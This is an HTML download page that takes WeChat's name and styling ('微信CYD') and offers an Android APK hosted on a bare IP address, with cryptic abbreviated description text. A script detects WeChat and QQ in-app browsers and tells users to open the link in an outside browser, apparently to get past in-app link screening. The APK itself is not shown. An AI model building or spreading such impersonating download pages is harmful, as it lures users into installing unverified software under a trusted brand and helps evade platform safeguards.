<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>微信CYD</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            color: #333;
            text-align: center;
            padding: 50px;
            user-select: none;
        }

        .container {
            max-width: 600px;
            min-width: ;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .app-icon {
            width: 100px;
            height: 100px;
            margin: 0 auto;
            border-radius: 20px;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .app-icon img {
            width: 100%;
            height: 100%;
            border-radius: 20px;
        }

        .app-name {
            font-size: 24px;
            margin: 20px 0;
            color: #1AAD19;
        }

        .blank {
            height: 10px;
        }

        .description {
            font-size: 16px;
            margin: 20px 0;
            color: #666;
        }

        .download-btn {
            display: inline-block;
            padding: 10px 20px;
            font-size: 18px;
            color: #fff;
            background-color: #02de6d;
            border: none;
            border-radius: 5px;
            text-decoration: none;
            transition: background-color 0.3s;
        }

        .download-btn:hover {
            background-color: #10ee7d;
        }
        .android{
            width: 25px;
            margin-right: 10px;
        }
        .btn_parent{
            align-items: center;
            display: flex;
        }
        .btn_text{
            font-size: 15px;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="app-icon">
            <img src="http://47.116.70.146/cyd/icon.jpg" alt="CYD">
        </div>
        <div class="app-name">微信</div>
        <div class="blank">
            <!-- WeChat CYD edition -->
        </div>
        <div class="description">
            FKCYD<br>
            YLSZG<br>
            CYDSZGZGNMTL<br>
        </div>
        <div class="blank"></div>
        <a href="http://47.116.70.146/cyd/CYD.apk" class="download-btn" id="downloadBtn">
            <div class="btn_parent">
                <img src="http://47.116.70.146/cyd/android.svg" class="android" alt="">
                <span>
                    下载微信CYD
                </span>
            </div>
            <div class="btn_text">
                ( 10.3M )
            </div>
        </a>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var ua = navigator.userAgent.toLowerCase();
            var isWeChat = ua.indexOf('micromessenger') !== -1;
            var isQQ = ua.indexOf('qq/') !== -1;

            document.getElementById('downloadBtn').addEventListener('click', function (event) {
                if (isWeChat || isQQ) {
                    event.preventDefault();
                    alert('请复制链接并在外部浏览器中打开下载：' + window.location.href);
                }
            });
        });
    </script>
</body>

</html>
